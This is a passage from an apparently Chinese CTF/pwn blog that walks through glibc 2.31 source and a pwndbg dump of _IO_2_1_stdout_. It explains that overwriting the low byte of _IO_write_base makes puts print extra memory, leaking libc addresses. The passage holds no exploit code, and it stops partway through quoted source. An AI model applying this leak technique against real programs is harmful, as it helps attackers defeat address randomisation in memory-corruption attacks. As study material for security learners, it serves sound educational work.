href="#linux-heap的分配" class="headerlink" title="linux heap的分配"></a>linux heap的分配</h3><h3 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h3><h1 id="一些杂项"><a href="#一些杂项" class="headerlink" title="一些杂项"></a>一些杂项</h1><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h2><h3 id="通过stdout泄露libc"><a href="#通过stdout泄露libc" class="headerlink" title="通过stdout泄露libc"></a>通过stdout泄露libc</h3><p>有时候像泄露libc基地址会发现没有可以直接利用的puts之类的输出函数，这时候就可以打<code>_IO_2_1_stdout_</code>来达到泄露libc地址的目的。</p><p><em><strong>我看源码的网站：<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/">https://elixir.bootlin.com/glibc/glibc-2.31/source/</a></strong></em></p><p><strong>！！！注意：以下内容会巨细无遗的展示阅读源码的每一步，觉得太烦了可以选择性观看！！！</strong></p><p>可以用pwndbg先大致看一下结构：），本节只会提到前一小部分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_2_1_stdout_</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_read_end = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_read_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_end = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_buf_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_buf_end = 0x7ffff7f9b7e4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7f9aa80 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;\n&quot;,</span><br><span class="line">    _lock = 0x7ffff7f9ca10 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7f9a980 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7f975e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索stdout，在stdio.c查看定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure><p>可以看到stdout实际是<code>_IO_2_1_stdout_</code></p><p>跟进过去，找到libio.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure><p>类型是io_file_plus，在libioP.h中找到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们先看看FILE类型（实际上也就是<code>_IO_FILE</code>）的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// pass</span></span><br></pre></td></tr></table></figure><p><strong>我们发现io_write_base是“Start of put area. ”，所以如果把最低位覆盖为0，就可以多输出几十个字节（一般是），从而达到泄露libc地址的目的。</strong></p><p>当然我们先把这个搁置一边，我们先来看看puts吧（毕竟我们总要有个输出的函数，哪怕只是一个puts(“hello.”);），在看puts源码之前要先补充一点：</p><blockquote><p>  在ioputs.c中使用 <code>weak_alias(_IO_puts, puts)</code> 创建了一个弱符号，实际上调用puts就是在调用_IO_puts，所以我们得看io_puts的源码。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_fwide是一个宏，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Return orientation of stream.  If mode is nonzero try to change</span></span><br><span class="line"><span class="comment">   the orientation first.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_fwide</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fwide (FILE *fp, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/// pass</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the orientation appropriately.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/// pass</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
